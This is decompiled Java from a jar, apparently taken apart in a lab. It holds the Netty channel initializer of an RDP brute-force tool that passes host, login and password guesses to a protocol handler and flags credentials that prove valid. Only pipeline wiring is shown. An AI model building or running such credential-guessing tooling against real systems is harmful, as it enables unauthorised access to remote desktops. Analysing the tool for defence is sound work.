/*    */ package rdp.gold.brute.netty;
/*    */ 
/*    */ import io.netty.channel.ChannelHandler;
/*    */ import io.netty.channel.ChannelInitializer;
/*    */ import io.netty.channel.ChannelPipeline;
/*    */ import io.netty.channel.socket.SocketChannel;
/*    */ import io.netty.handler.logging.LogLevel;
/*    */ import io.netty.handler.logging.LoggingHandler;
/*    */ import io.netty.handler.timeout.WriteTimeoutHandler;
/*    */ import java.util.concurrent.TimeUnit;
/*    */ import java.util.concurrent.atomic.AtomicBoolean;
/*    */ import org.apache.log4j.Logger;
/*    */ import rdp.gold.brute.Config;
/*    */ 
/*    */ public class ProtocolInitializer extends ChannelInitializer<SocketChannel>
/*    */ {
/* 17 */   private static final Logger logger = Logger.getLogger(ProtocolInitializer.class);
/*    */   private String host;
/*    */   private int port;
/*    */   private String domain;
/*    */   private String login;
/*    */   private String password;
/*    */   private AtomicBoolean isValid;
/*    */   private StringBuilder getDomain;
/*    */   
/*    */   public ProtocolInitializer(String host, int port, String domain, String login, String password, AtomicBoolean isValid, StringBuilder getDomain)
/*    */   {
/* 28 */     this.host = host;
/* 29 */     this.port = port;
/* 30 */     this.domain = domain;
/* 31 */     this.login = login;
/* 32 */     this.password = password;
/* 33 */     this.isValid = isValid;
/* 34 */     this.getDomain = getDomain;
/*    */   }
/*    */   
/*    */   public void initChannel(SocketChannel ch) throws Exception
/*    */   {
/* 39 */     ChannelPipeline pipeline = ch.pipeline();
/*    */     
/* 41 */     pipeline.addLast(new ChannelHandler[] { new io.netty.handler.timeout.ReadTimeoutHandler(Config.BRUTE_TIMEOUT.intValue(), TimeUnit.MILLISECONDS) });
/* 42 */     pipeline.addLast(new ChannelHandler[] { new WriteTimeoutHandler(Config.BRUTE_TIMEOUT.intValue(), TimeUnit.MILLISECONDS) });
/* 43 */     pipeline.addLast(new ChannelHandler[] { new LoggingHandler(LogLevel.TRACE) });
/* 44 */     pipeline.addLast(new ChannelHandler[] { new ProtocolHandler(this.host, this.port, this.domain, this.login, this.password, this.isValid, this.getDomain) });
/*    */   }
/*    */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\netty\ProtocolInitializer.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */